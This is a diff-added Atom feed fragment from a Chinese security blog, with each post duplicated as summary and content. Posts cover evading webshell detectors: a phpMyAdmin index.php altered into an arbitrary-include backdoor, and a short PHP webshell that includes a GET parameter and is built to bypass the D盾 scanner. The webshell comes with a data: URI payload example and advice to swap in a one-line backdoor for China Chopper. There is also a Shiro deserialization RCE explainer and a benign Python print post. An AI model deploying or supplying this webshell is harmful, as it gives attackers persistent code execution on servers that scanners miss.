+<p>记得Phpmyadmin的index.php文件中包含有<code>include ROOT_PATH . $_REQUEST['target'];</code>这样的代码，如果不看上下文，这个妥妥的文件包含漏洞。不过上文有过滤和判断处理，导致无法包含任意文件。我将其修改为包含任意文件。同时保留来一些源码，把影响执行的代码注释掉（因为适应多种环境，适用但文件的情况）。<br>
+最终修改的代码如下：</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。<br>
+首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来实现的（仅为猜测）。我这里绕过的思路采用的是，使用开源程序进行修改，带入一句话后门代码。</p>
+<p>记得Phpmyadmin的index.php文件中包含有<code>include ROOT_PATH . $_REQUEST['target'];</code>这样的代码，如果不看上下文，这个妥妥的文件包含漏洞。不过上文有过滤和判断处理，导致无法包含任意文件。我将其修改为包含任意文件。同时保留来一些源码，把影响执行的代码注释掉（因为适应多种环境，适用但文件的情况）。<br>
+最终修改的代码如下：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[最新绕过D盾的php Webshell]]></title>
+        <id>https://bacde.me/post/Webshellkill-Bypass-Php-Webshell/</id>
+        <link href="https://bacde.me/post/Webshellkill-Bypass-Php-Webshell/">
+        </link>
+        <updated>2019-12-28T11:32:53.000Z</updated>
+        <summary type="html"><![CDATA[<p>去年分析D盾的查杀规律弄的绕过。<br>
+查杀效果：<br>
+<img src="https://www.bacde.me/post-images/1577534683394.png" alt="" loading="lazy"></p>
+<p>具体请看代码：</p>
+<pre><code>&lt;?php
+function cc(){
+    global $b;
+    $a =$_GET[$b];  //此处可改成POST方式
+    $str =$a;
+    return $str;
+}
+?&gt;
+&lt;?php
+$b=&quot;url&quot;;
+$c=cc();
+$aa = $c;
+
+include($aa);
+
+</code></pre>
+<p>传入参数方式：<br>
+http://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）<br>
+例如：<br>
+http://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==<br>
+上看base64,后面为要执行的代码，代码要带<?php，然后将代码进行base64编码传入。这里的例子是<?php phpinfo(); ?>，实战中可以把代码改成一句话，然后使用菜刀连接即可。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>去年分析D盾的查杀规律弄的绕过。<br>
+查杀效果：<br>
+<img src="https://www.bacde.me/post-images/1577534683394.png" alt="" loading="lazy"></p>
+<p>具体请看代码：</p>
+<pre><code>&lt;?php
+function cc(){
+    global $b;
+    $a =$_GET[$b];  //此处可改成POST方式
+    $str =$a;
+    return $str;
+}
+?&gt;
+&lt;?php
+$b=&quot;url&quot;;
+$c=cc();
+$aa = $c;
+
+include($aa);
+
+</code></pre>
+<p>传入参数方式：<br>
+http://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）<br>
+例如：<br>
+http://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==<br>
+上看base64,后面为要执行的代码，代码要带<?php，然后将代码进行base64编码传入。这里的例子是<?php phpinfo(); ?>，实战中可以把代码改成一句话，然后使用菜刀连接即可。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Python2与Python3差异之print]]></title>
+        <id>https://bacde.me/post/python2-to-python3-print/</id>
+        <link href="https://bacde.me/post/python2-to-python3-print/">
+        </link>
+        <updated>2019-12-26T14:05:32.000Z</updated>
+        <summary type="html"><![CDATA[<p>时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花许多时间与精力，但是转Python3是早晚都要面对的。最近在迁移自己的代码到Python3，对于迁移的过程中遇到的情况进行总结。</p>
+<p>首先我们来说一下常用的print。<br>
+最明显的区别就在于，我们在2.x版本中的<code>print &quot;hello world&quot;</code> ，在3.x版本中会报错。必须要以<code>print(&quot;hello world&quot;)</code>这样的格式。为什么会发生这样的变化呢？下面就让我们来看一下～</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花许多时间与精力，但是转Python3是早晚都要面对的。最近在迁移自己的代码到Python3，对于迁移的过程中遇到的情况进行总结。</p>
+<p>首先我们来说一下常用的print。<br>
+最明显的区别就在于，我们在2.x版本中的<code>print &quot;hello world&quot;</code> ，在3.x版本中会报错。必须要以<code>print(&quot;hello world&quot;)</code>这样的格式。为什么会发生这样的变化呢？下面就让我们来看一下～</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Shiro 反序列化漏洞实战]]></title>
+        <id>https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/</id>
+        <link href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">
+        </link>
+        <updated>2019-12-17T13:55:10.000Z</updated>
+        <summary type="html"><![CDATA[<p>Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进。主要修改了检测方式，并使利用方式更加简单灵活，使其更具有实战意义，提升其效率。</p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>
+在服务端接收cookie值时，按照如下步骤来解析处理：<br>
+1、检索RememberMe cookie 的值<br>
+2、Base 64解码<br>
+3、使用AES解密(加密密钥硬编码)<br>
+4、进行反序列化操作（未作过滤处理）</p>
+<p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进。主要修改了检测方式，并使利用方式更加简单灵活，使其更具有实战意义，提升其效率。</p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>
+在服务端接收cookie值时，按照如下步骤来解析处理：<br>
+1、检索RememberMe cookie 的值<br>
+2、Base 64解码<br>
+3、使用AES解密(加密密钥硬编码)<br>
+4、进行反序列化操作（未作过滤处理）</p>
+<p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
+]]></content>
+    </entry>
+</feed>
